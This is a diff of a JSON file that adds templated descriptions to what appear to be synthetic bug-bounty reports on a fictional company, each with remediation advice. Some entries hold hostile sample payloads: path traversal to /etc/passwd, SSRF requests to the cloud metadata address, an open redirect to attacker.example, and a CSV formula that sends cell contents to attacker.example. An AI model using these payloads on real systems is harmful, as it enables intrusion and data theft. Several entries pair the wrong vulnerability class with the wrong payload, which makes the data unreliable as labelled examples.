+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8928,7 +8997,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9045,7 +9115,8 @@
           "offset": "5d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9157,7 +9228,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9263,7 +9335,8 @@
           "offset": "3d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9387,7 +9460,8 @@
           "offset": "2d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9501,7 +9575,8 @@
           "offset": "7d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9636,7 +9711,8 @@
           "offset": "8d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9763,7 +9839,8 @@
           "offset": "6d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9891,7 +9968,8 @@
           "offset": "4d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9995,7 +10073,8 @@
           "offset": "1d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10150,7 +10229,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10306,7 +10386,8 @@
           "offset": "8d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10406,7 +10487,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10478,7 +10560,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10602,7 +10685,8 @@
           "offset": "16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10722,7 +10806,8 @@
           "offset": "2d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10825,7 +10910,8 @@
           "offset": "23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10967,7 +11053,8 @@
           "offset": "7d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11077,7 +11164,8 @@
           "offset": "18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11237,7 +11325,8 @@
           "offset": "7d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11365,7 +11454,8 @@
           "offset": "21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11512,7 +11602,8 @@
           "offset": "4d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11652,7 +11743,8 @@
           "offset": "7d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11768,7 +11860,8 @@
           "offset": "13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11888,7 +11981,8 @@
           "offset": "6d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12011,7 +12105,8 @@
           "offset": "1d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12159,7 +12254,8 @@
           "offset": "5d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12267,7 +12363,8 @@
           "offset": "1d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12402,7 +12499,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12553,7 +12651,8 @@
           "offset": "4d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12697,7 +12796,8 @@
           "offset": "4d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
